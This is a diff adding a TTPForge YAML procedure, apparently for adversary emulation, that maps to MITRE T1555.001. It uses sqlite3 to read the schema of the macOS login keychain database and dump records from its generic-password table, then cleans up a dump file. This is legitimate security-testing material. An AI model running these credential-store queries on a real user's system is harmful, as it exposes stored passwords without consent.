@@ -1,0 +1,49 @@
+api_version: 2.0
+uuid: 12345678-1234-1234-1234-000000000005
+name: Keychain Database Direct Access
+description: Direct database access to macOS keychain SQLite database
+author: TTPForge
+created: 2025-01-30
+tactics:
+  - Credential Access
+techniques:
+  - T1555.001
+requirements:
+  platforms:
+    - os: darwin
+args:
+  - name: keychain_path
+    description: Path to keychain database
+    default: "~/Library/Keychains/login.keychain-db"
+  - name: output_file
+    description: File to store query results
+    default: "/tmp/keychain_dump.txt"
+steps:
+  - name: Verify Keychain Exists
+    type: command
+    command: "test -f {{ keychain_path }}"
+    
+  - name: Query Keychain Database
+    type: command
+    command: "sqlite3 {{ keychain_path }} '.schema' 2>/dev/null | head -20"
+    
+  - name: Extract Keychain Records
+    type: command
+    command: "sqlite3 {{ keychain_path }} 'SELECT * FROM genp LIMIT 5;' 2>/dev/null || echo 'Keychain access restricted'"
+
+checks:
+  - type: stdout_contains
+    value: "CREATE"
+    description: Verify SQLite query returns database schema
+
+tests:
+  - name: Test Database Connection
+    description: Test SQLite access to keychain database
+    test_type: default
+    steps:
+      - "sqlite3 {{ keychain_path }} '.tables' 2>/dev/null || echo 'DB access check'"
+
+cleanup:
+  - type: command
+    command: "rm -f {{ output_file }}"
+    description: Remove extracted keychain dump
